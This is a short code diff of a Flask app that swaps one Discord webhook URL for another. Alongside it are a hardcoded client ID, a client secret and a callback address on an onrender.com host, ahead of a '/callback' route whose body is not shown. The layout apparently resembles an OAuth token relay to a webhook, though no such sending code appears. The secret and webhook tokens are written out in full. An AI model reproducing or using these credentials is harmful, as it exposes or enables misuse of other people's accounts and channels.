@@ -5,7 +5,7 @@ app = Flask(__name__)
 ID = "1501206551942398092"
 SEC = "7A2BCkMpq3sqaV0RwYu2JOYjc2qRtfjz"
 URI = "[https://web-assets-v1.onrender.com/callback](https://web-assets-v1.onrender.com/callback)"
-WEB = "[https://discord.com/api/webhooks/1501215100667691090/3ZWwbeqzcBxsOTKERvyFrH8mfh-JxMkPWLKbLjk4ZOZIdBFN6zjmmEcL4cq5Ji5DcCOx](https://discord.com/api/webhooks/1501215100667691090/3ZWwbeqzcBxsOTKERvyFrH8mfh-JxMkPWLKbLjk4ZOZIdBFN6zjmmEcL4cq5Ji5DcCOx)"
+WEB = "[https://discord.com/api/webhooks/1501215104677449888/0m91vskK1e3xajgzfnJ2whw9pNizDOpRxdEQIC9r2qDFbrxI7sh3j54q4S2EWwAvF6qt](https://discord.com/api/webhooks/1501215104677449888/0m91vskK1e3xajgzfnJ2whw9pNizDOpRxdEQIC9r2qDFbrxI7sh3j54q4S2EWwAvF6qt)"
 
 @app.route('/callback')
 def callback():
